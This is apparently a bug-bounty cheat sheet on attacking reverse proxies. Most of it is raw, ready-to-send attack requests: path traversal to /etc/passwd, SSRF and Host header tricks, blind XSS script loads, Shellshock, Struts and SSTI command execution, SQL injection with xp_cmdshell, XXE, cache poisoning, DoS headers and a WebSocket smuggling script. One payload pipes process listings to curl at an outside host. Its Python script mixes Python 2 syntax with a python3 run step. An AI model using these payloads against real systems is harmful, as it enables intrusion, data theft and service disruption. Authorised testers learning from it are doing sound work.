# Attacking Secondary Context

### Identify Some " Hidden " Reverse HTTP Proxies

{% embed url="https://agarri.fr/blog/archives/2011/11/12/traceroute-like_http_scanner/index.html" %}

The heuristic rules used are the following :

* A `502` status code is returned (RFC 2616, section 14.31)
* A `483` status code is returned (RFC 3261, section 8.1.1.6)
* When using TRACE, the body contains the '`X-Forwarded-For`' string
* '`Via`' or '`X-Via`' headers are detected
  * Some fields are different between hops :
  * HTTP status codes
  * '`Server`' headers
  * '`Content`-Type' headers
  * '`Via`' headers
  * HTML titles
  * HTML '`address`' tags
  * '`X-Forwarded-For`' values in body
* Using [HTTP-Traceroute.py](https://www.agarri.fr/docs/HTTP-Traceroute.py) tool.

### Identify Routing Of HTTP Request

* Does `/Endpoint-To-Proxy/../` Return **Something** Different Than `/`&#x20;
* Does `/Endpoint-To-Proxy/../` Return **Headers** Different Than `/`&#x20;
* Try To Inject **Encode , Double** OR **Triple URL Encoding** In Parameters

&#x20;e.g. `https://www.company.com/api/path?id=%23`&#x20;

|  .    | %2e |
| ----- | --- |
| #     | %23 |
| ?     | %3F |
| &     | %26 |
|    /  | %2F |
| @     | %40 |

* Try To Inject Encode , Double OR Triple URL Encoding These Payloads After URL&#x20;
* `..%2f%23`&#x20;
* `..;/`&#x20;
* `..%00/`
* `..%0d/`
* `..%5c`
* `..\`
* `..%ff/`
* `%2e%2e%2f`&#x20;
* `.%2e/`&#x20;

e.g. `https://www.company.com/api/..%00/`

### Using OPTIONS Method for endpoint discovery

* Using `OPTIONS` Method to identify other endpoints

{% embed url="https://x.com/intigriti/status/1070662964447981568" %}

### Check PUT Method

* Try To **Change Request Method** To `PUT` If You Got `201 Created` Then There Is `RCE`

```http
PUT /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com

// references
https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/
https://www.arridae.com/blogs/HTTP-PUT-method.php
https://asfiyashaikh.medium.com/exploiting-put-method-d2d0cd7ba662

```

* Try To Append `.json` Extension To Your Endpoints `e.g. /endpoint-To-Proxy.json` To Get Sensitive Information -> [Tweet](https://x.com/intigriti/status/1177178910397796353)

{% embed url="https://x.com/intigriti/status/1177178910397796353" fullWidth="false" %}

### Smuggling via HTTP/2 Cleartext

* Try To Figure Out Are There Endpoints Accept Establishing HTTP/2 Cleartext , If Yes Try To Smuggler It By Using Tool e.g. [h2csmuggler](https://github.com/BishopFox/h2csmuggler)&#x20;

{% embed url="https://bishopfox.com/blog/h2c-smuggling-request" %}

```bash
Steps to produce :- 
1 - Collect All The Endpoints 
2 - Put It In File Called e.g. url.txt 
3 - Open Your Terminal 
4 - Write This Command python3 h2csmuggler.py --scan-list url.txt --threads 5
```

### Smuggling WebSockets

* Smuggler Websocket Endpoints

{% embed url="https://speakerdeck.com/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis?slide=36" %}

{% embed url="https://www.youtube.com/watch?v=gANzRo7UHt8" %}

```python
import socket
req1 = '''GET /ُEndpoint-To-Proxy/ HTTP/1.1
Host: company.com
Sec-WebSocket-Version: 1337
Upgrade: websocket
'''.replace('\n', '\r\n')
req2 = '''GET /Internal-Endpoint HTTP/1.1
Host: localhost:PORT
'''.replace('\n', '\r\n')
def main(netloc):
    host, port = netloc.split(':')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))
    sock.sendall(req1)
    sock.recv(4096)
    sock.sendall(req2)
    data = sock.recv(4096)
    data = data.decode(errors='ignore')
    print data
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()
    
-----------------------------------------------------------------------------
Steps to produce :-
1 - Open Your Terminal
2 - Write This Command
 python3 websocket-smuggler.py
```

### XSS

* **XSS in Referrer**

```http
Referer: "><script src=//me.xss.ht></script>
```

{% embed url="https://medium.com/@newp_th/how-i-find-blind-xss-vulnerability-in-redacted-com-33af18b56869" %}

* If There Is **Nginx As Reverse Proxy** Try To Inject **Blind XSS Payloads**

{% embed url="https://speakerdeck.com/greendog/reverse-proxies-and-inconsistency?slide=17" %}

```http
GET /Endpoint-To-Proxy/%3D%22img
 src='https://RandomString(10).id.burpcollaborator.net'%22%3E HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
```

* Try To Inject XSS Payloads After Your Endpoints

```http
GET /Endpoint-To-Proxy/
"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101
%3B%26%23114%3B%26%23116%3B(document.domain)> HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
---------------------
// resources
https://medium.com/@saamux/reflected-xss-on-www-yahoo-com-9b1857cecb8c
https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd
https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27
```

### Host Header Injection

{% embed url="https://x.com/MrTuxracer/status/1142165824532340737" %}

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: RandomString(10).id.burpcollaborator.net
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
-----------------------------------------------------------
// Ambiguate The Host Header 
Host: company.com@RandomString(10).id.burpcollaborator.net
Host: company.com:@RandomString(10).id.burpcollaborator.net
Host: company.com:RandomString(10).id.burpcollaborator.net
Host: RandomString(10).id.burpcollaborator.net
Host: localhost
Host: company.com:PORT
----------------
Host: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
---------------------
//Space-surrounded Host Header
Host: www.company.com
 Host: RandomString(10).id.burpcollaborator.net
-------------------------
//Change Host Header To host Header
host: comapny.com
------------------------
// o Remove The Space That In The Host Header
Host:www.company.com
---------------- 
// Add Tab Instead Of The Space That In The Host Header
Host:   www.company.com
----------------------------
Add / , : , \x00 , \x20 , \x09 , \xad After Value Of The Host Header
Host: www.company.com sensitive-file.txt
----------------------------------------
// Override The Host Header e.g. POST https://company.com 
// AND Change Host Header e.g Host: RandomString(10).id.burpcollaborator.net 
// To Get SSRF
GET https://company.com/Endpoint-To-Proxy HTTP/1.1
Host: RandomString(10).id.burpcollaborator.net
--------------------------------------
// Spoof The Original IP
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0000::1

Source: https://hackerone.com/reports/44513
-------------------------------
GET /Endpoint-To-Proxy HTTP/1.0
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net

Source: https://twitter.com/ADITYASHENDE17/status/1305723250413105152
----------------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0177.1

Source: https://twitter.com/agarri_fr/status/965196958011920384
-----------------------------------------------------
// Other Bypasses
X-Forwarded-For: 127.0.0.1\r
X_Forwarded_For: 127.0.0.1
Forwarded: for=127.0.0.1 
X-ProxyUser-Ip: 127.0.0.1
X-Remote-User: admin
Referer: RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
----------
Referer: RandomString(10).id.burpcollaborator.net
Referer: RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
--------------------------------------
# Inject Noun-Standard Headers
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
X-Originating-IP: RandomString(10).id.burpcollaborator.net
X-WAP-Profile: https://RandomString(10).id.burpcollaborator.net
True-Client-IP: RandomString(10).id.burpcollaborator.net
----------------------------------------------------------------------------
# Double Noun-Standard Headers
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
--------------------------------------------------
# Sources 
https://zeronights.ru/wp-content/themes/zeronights-2019/public/materials/4_ZN2019_Morozov_SSRF.pdf
https://blog.paloaltonetworks.com/2019/10/cloud-kubernetes-vulnerabilities/
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
https://speakerdeck.com/bo0om/at-home-among-strangers?slide=8
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Forwarded
https://www.slideshare.net/sergeybelove/attacking-thru-http-host-header
https://www.slideshare.net/ssusera0a306/offzone-another-waf-bypass
https://www.youtube.com/watch?v=zP4b3pw94s0
https://hackerone.com/reports/429617
https://medium.com/bugbountywriteup/identifying-escalating-http-host-header-injection-attacks-7586d0ff2c67
https://www.youtube.com/watch?v=zP4b3pw94s0
https://www.youtube.com/watch?v=V8f6gqrCbZU
https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet

```

* Try To Change Routing Of The Request To Get SSRF

{% embed url="https://x.com/nnwakelam/status/1280796589276098560" %}

```http
GET /Endpoint-To-Proxy@RandomString(10).id.burpcollaborator.net# HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
-------------------------------------------------
GET @RandomString(10).id.burpcollaborator.net/Endpoint-To-Proxy HTTP/1.1
GET :@RandomString(10).id.burpcollaborator.net/Endpoint-To-Proxy HTTP/1.1
GET /Endpoint-To-Proxy:@RandomString(5).id.burpcollaborator.net# HTTP/1.0
GET /Endpoint-To-Proxy@RandomString(5).id.burpcollaborator.net# HTTP/1.0
----------------------------------------------
// resources
https://www.youtube.com/watch?v=zP4b3pw94s0
https://www.youtube.com/watch?v=gluSEBZpplQ
https://www.contextis.com/us/blog/server-technologies-reverse-proxy-bypass
```

### Blind XSS or Time-Based SQLi in X-Forwarded-For header&#x20;

```html
"><script src=//me.xss.ht></script>
 ";WAITFOR DELAY '0.0.20'--
```

{% embed url="https://x.com/intigriti/status/1093468744079364096" %}

{% embed url="https://research.securitum.com/x-forwarded-for-header-security-problems/" %}

### Blind XSS or QLI in User Agent

```
"><script src=//me.xss.ht></script>
'XOR(if(now()=sysdate(),sleep(30),0))OR'
User-Agent: Mozilla/5.0'XOR(if(now()=sysdate(),sleep(30),0))OR'
```

{% embed url="https://twitter.com/0x01alka/status/1112060432691412998" %}

{% embed url="https://hackerone.com/reports/297478" %}

### RCE in User Agent

```http
User-Agent: { :;}; echo $(</etc/passwd)
```

{% embed url="https://twitter.com/hemanth1261/status/1265691520495017984" %}

### Double Content-Type Header

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data
Content-Type: application/json
Content-Length: Number
Origin: https://www.company.com
parameter=value
```

### Invalid Content-Type Header

```http
Content-Type: */*
```

{% embed url="https://twitter.com/xsaadahmedx/status/1145052664046206976" %}

### Inject l5d-dtab Header

* If There Is Linkerd Service Try To `Inject l5d-dtab` Header `e.g. l5d-dtab: /$/inet/169.254.169.254/80` To Get **`AWS metadata`**

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
l5d-dtab: /$/inet/169.254.169.254/80
Content-Length: Number
Origin: https://www.company.com
parameter=value
```

{% embed url="https://twitter.com/nirvana_msu/status/1084144955034165248" %}

### Content-Length Header With Number And There Is Not Body Content To Expose Internal Information

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Content-Length: Number
Origin: https://www.company.com
```

### Cache Poisoning and DOS

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
 Host: RandomString(10).id.burpcollaborator.net
 --------------------------
GET /Endpoint-To-Proxy HTTP/1.1
User-Agent: Mozilla/5.0
 Host: RandomString(10).id.burpcollaborator.net
Host: company.com
----------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
--------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: www.company.com:PORT
--------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: www.company.com
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
-----------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Server: RandomString(10).id.burpcollaborator.net
-------------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: null
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
----------------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: '-alert(1)-'

->https://www.youtube.com/watch?v=bDxYWGxuVqE
------------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net

-> https://www.youtube.com/watch?v=j2RrmNxJZ5c
--------------------------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Host: RandomString(10).id.burpcollaborator.net
--------------------------------------------------
X-Host: RandomString(10).id.burpcollaborator.net
------------------
X-Oversized-Header-1: xxxxx 20K xxxx
X-Oversized-Header-2: xxxxx 20K xxxx
---------------------------
X-Metachar-Header: \n
->  https://cpdos.org/
--------------------------------------------------
X-HTTP-Method-Override: PUT
- https://blog.appsecco.com/aws-ec2-imdsv2-versus-an-esoteric-http-method-8bc1b9616ae8
- https://cpdos.org/
----------------------
X-Forwarded-Port: 123
- https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
- https://hackerone.com/reports/409370
----------------------------------
X-Forwarded-SSL: off
- https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
---------------------
Max-Forwards: 0
------------------------------
zTransfer-Encoding: xxxx
--------------
Accept_Encoding: xxxx
-------------------
Range: bytes=cow
-----------------------
User-Agent: xxxx 20K xxxx
------------------------
Try To Inject Keep-Alive , Transfer-Encoding , Trailer , Upgrade , Proxy-Authorization , TE
Connection OR Proxy-Authenticate e.g. Connection: close, Cookie To Abuse Hop-By-Hop
Connection: close, Cookie
- https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
-----------------------------
Try To Inject ?%xx , %xx OR %xxx 20k xxx e.g. Endpoint-To-Proxy/%xx To
Do DOS Attack
GET /Endpoint-To-Proxy/%xxx 20k xxx HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0

- https://hackerone.com/reports/500686
----------------------------
Try To Add Parameter With Value e.g. ?parameter=cache OR If There Is Parameters
Try To Add Another e.g. lang=en&parameter=cache To Achieve Cache Poisoning
GET /Endpoint-To-Proxy?parameter=cache HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0

- https://www.youtube.com/watch?v=bDxYWGxuVqE
------------------------------------------------
Add Parameter With Large Value e.g. ?parameter=xxx 20K xxx
GET /Endpoint-To-Proxy?parameter=xxxx 20K xxxx HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0

- https://www.youtube.com/watch?v=bDxYWGxuVqE
----------
GET /Endpoint-To-Proxy?_parameter=cache HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0

- https://www.youtube.com/watch?v=bDxYWGxuVqE
;parameter=cache 
--------------------------------------
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive

parameter=cache
_parameter=cache
```

* [https://www.youtube.com/watch?v=V8f6gqrCbZU](https://www.youtube.com/watch?v=V8f6gqrCbZU)
* [https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures](https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures)
* [https://twitter.com/musab1995/status/1321844052543840258](https://twitter.com/musab1995/status/1321844052543840258)&#x20;

### LFI

If There Is Nginx As Reverse Proxy AND Weblogic As Backend Try To Use /#/../ To Change Route Of Endpoints

```http
GET /Endpoint-To-Proxy/#/../../../../../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
---------------------------------------
GET /../../../../../../../etc/passwd;/../Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
---------------------------------------
GET /Endpoint-To-Proxy../../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
--------------------------------------------
GET /Endpoint-To-Proxy/..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
------------------------------------------
Try To Inject \..\.\..\.\..\.\..\.\..\.\..\.\Internal-Endpoint OR
\..\..\..\.\..\..\Internal-Endpoint\..\..\..\..\..\etc\passwd%3F.js
GET /Endpoint-To-Proxy\..\.\..\.\..\.\..\.\Internal-Endpoint HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
---------------------------------------------
Let’s Assume There Is Routing To Pulse Secure SSL VPN So , 
Try To Inject To Get File etc/hosts
GET /Endpoint-To-Proxy/dana-na/../dana/html5acc/guacamole/../
../../../../../etc/hosts?/dana/html5acc/guacamole/# HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
----------------------------------------------------
s Apache As Reverse Proxy Try To Use /..// To Change Route Of Endpoints
GET /Endpoint-To-Proxy/..//../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
--------------------------------------------------
If There Is Apache As Reverse Proxy Try To Use %3F To Bypass Blacklist Of
Endpoints
GET /Endpoint-To-Proxy/.git%3FAllowed HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
------------------------------------------------
If There Is Nginx As Reverse Proxy 
AND Apache As Backend Try To Use //../ To Change Route Of Endpoints
GET /Endpoint-To-Proxy/../../../../../../../etc/passwd//../ HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
-------------------------------------------------------
If There Is Nginx As Reverse Proxy Try To Use ..;/ To Bypass Blacklist Of Endpoints 
OR Bypass CORS
GET /Endpoint-To-Proxy/..;/../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
---------------------------------------
GET /../../../../etc/passwd/..;/Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
----------------------------------------
GeT /Endpoint-To-Proxy/../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
------------------------------------------
# If There Is Varnish As Reverse Proxy
GeT /Endpoint-To-Proxy/../../../../../../etc/passwd HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
------------------------------------------
# If There Is Haproxy OR Varnish As Reverse Proxy
GET http://company.com/Endpoints-To-Proxy/.git HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
-------------------------------------
```

* [https://speakerdeck.com/greendog/reverse-proxies-and-inconsistency?slide=19](https://speakerdeck.com/greendog/reverse-proxies-and-inconsistency?slide=19)
* [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)
* [https://bugreader.com/updatelap@local-file-inclusion-in-peeringgooglecom-70](https://bugreader.com/updatelap@local-file-inclusion-in-peeringgooglecom-70)
* [https://www.youtube.com/watch?v=28xWcRegncw](https://www.youtube.com/watch?v=28xWcRegncw)
* [https://www.youtube.com/watch?v=gluSEBZpplQ](https://www.youtube.com/watch?v=gluSEBZpplQ)
* [https://hackerone.com/reports/260420](https://hackerone.com/reports/260420)
* [https://samcurry.net/hacking-starbucks/](https://samcurry.net/hacking-starbucks/)
* [https://blog.blackfan.ru/2018/01/pda-test.yandex.ru-file-reading.html](https://blog.blackfan.ru/2018/01/pda-test.yandex.ru-file-reading.html)
* [https://hackerone.com/reports/671857](https://hackerone.com/reports/671857)
* [https://hackerone.com/reports/680480](https://hackerone.com/reports/680480)
* [https://medium.com/@valeriyshevchenko/critical-vulnerabilities-in-pulse-secure-and-fortinet-ssl-vpns-in-the-wild-internet-3991ea9e6481](https://medium.com/@valeriyshevchenko/critical-vulnerabilities-in-pulse-secure-and-fortinet-ssl-vpns-in-the-wild-internet-3991ea9e6481)
* [https://www.youtube.com/watch?v=gluSEBZpplQ](https://www.youtube.com/watch?v=gluSEBZpplQ)

### RCE

* Try To Change Method To POST And Add Body e.g. To Get RCE

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Content-Type":"application/x-www-form-urlencoded
Origin: https://www.company.com
Connection: keep-alive
<?php phpinfo(); ?>
```

{% embed url="https://x.com/Wh11teW0lf/status/1252131536570286080" %}

* **RCE in Content-Type Header**

```http
Content-Type: %{#context['com.opensymphony.xwork2
.dispatcher.HttpServletResponse'].addHeader(Header,4*4)}.multip
art/form-data
```

* [https://medium.com/@abhishake100/rce-via-apache-struts2-still-out-there-b15ce205aa21](https://medium.com/@abhishake100/rce-via-apache-struts2-still-out-there-b15ce205aa21)
* [https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6](https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6)
* [https://blog.cobalt.io/how-customer-collaboration-during-a-pentest-can-lead-to-finding-a-remote-code-execution-rce-da59cb3d1dfb](https://blog.cobalt.io/how-customer-collaboration-during-a-pentest-can-lead-to-finding-a-remote-code-execution-rce-da59cb3d1dfb)
* [https://twitter.com/0x01alka/status/1112060432691412998](https://twitter.com/0x01alka/status/1112060432691412998)

### SSTI

{% embed url="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" %}

{% embed url="http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/" %}

```http
GET /Endpoint-To-Proxy/(${T(java.lang.Runtime).
 getRuntime().exec('nslookup id.burpcollaborator.net')}) HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
```

### SQLi

```http
GET /Endpoint-To-Proxy/
'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
```

```http
GET /Endpoint-To-Proxy/
'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
```

{% embed url="https://hackerone.com/reports/758654" %}

### CRLF

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{
"parameter":"value%0A%01%09Host:%20id.burpcollaborator.net"
}
```

{% embed url="https://twitter.com/m4ll0k/status/1310439013581549568" %}

### Paameter Manipulation

* Assume Backend Endpoint Take Value Of One Parameter As Path So Inject Encode , Double OR Triple URL Encoding ;@me.com , @me.com OR :@me.com To Get SSRF

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{
"parameter":";@RandomString(10).id.burpcollaborator.net"
}
```

{% embed url="https://twitter.com/nnwakelam/status/1274898632223801344" %}

* Assume Backend Endpoint Take Value Of One Parameter As Rewrite Configuration e.g. `rewrite ^.*$ $arg_parameter;` So Inject e.g. LFI Payloads To Get e.g. `LFI`

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{ "parameter":"../../../../../../../../../../../../etc/passwd" }
```

{% embed url="https://hackerone.com/reports/513236" %}

* **RCE**

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{"parameter":"${nslookup id.burpcollaborator.net}"}
```

{% embed url="https://hackerone.com/reports/73567" %}

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{
"parameter":"&nslookup me.com&'\"`0&nslookup me.com&`'"
}
```

{% embed url="https://twitter.com/Random_Robbie/status/992174798699679751" %}

* [https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/](https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/)
* [https://www.youtube.com/watch?v=ha6LD1-RiJU](https://www.youtube.com/watch?v=ha6LD1-RiJU)

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{
"parameter":"0 -write |ps${IFS}aux|curl${IFS}http://me.com${IFS}-d${IFS}@-"
}
```

{% embed url="https://hackerone.com/reports/212696" %}

* **SQL Injection**

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
Content-Type: application/json
Content-Length: Number
{"parameter":"; DECLARE @command varchar(255); SELECT
@command='ping id.burpcollaborator.net'; EXEC
Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'"}
```

{% embed url="https://hackerone.com/reports/816254" %}

* **Blind XSS**

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
Content-Type: application/json
Content-Length: Number


{
"parameter":"</script><svg/onload='+/"/+/onmouseover=1/+(s=do
cument.createElement(/script/.source),s.stack=Error().stack,s.src
=(/,/+/RandomString(10).id.burpcollaborator.net/).slice(2),docume
nt.documentElement.appendChild(s))//'>"
}
```

* [https://www.youtube.com/watch?v=ha6LD1-RiJU](https://www.youtube.com/watch?v=ha6LD1-RiJU)

### XXE

* If Body Of Request JSON Data , Try To Convert It XML With XXE Payloads

```http
POST /Endpoint-To-Proxy/ HTTP/1.1
Host: www.company.com
Content-Type: application/xml
Content-Length: Number
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
 <parame
```

* [https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi](https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi)
* [https://blog.netspi.com/playing-content-type-xxe-json-endpoints/](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/)
* [https://blog.zsec.uk/blind-xxe-learning/](https://blog.zsec.uk/blind-xxe-learning/)

```http
POST /Endpoint-To-Proxy/ HTTP/1.1
Host: www.company.com
Content-Type: application/xml
Content-Length: Number


<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xml "href="http://RandomString(10).id.burpcollaborator.net/file.xsl"?>
<!DOCTYPE root PUBLIC "-//A/B/EN" http://RandomString(10).id.burpcollaborator.net/file.dtd [
<!ENTITY % remote SYSTEM "http://RandomString(10).id.burpcollaborator.net/path">
<!ENTITY xxe SYSTEM "http://RandomString(10).id.burpcollaborator.net/path">
%remote;
]>
<root>
    <foo>&xxe;</foo>
    <x xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:includehref="http://RandomString(10).id.burpcollaborator.net/" ></x>
    <y xmlns=http://a.b/
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://a.b/
    http:///RandomString(10).id.burpcollaborator.net/file.xsd">a</y>
</root>
```

* [https://youtube.com/watch?v=ha6LD1-RiJU](https://youtube.com/watch?v=ha6LD1-RiJU)

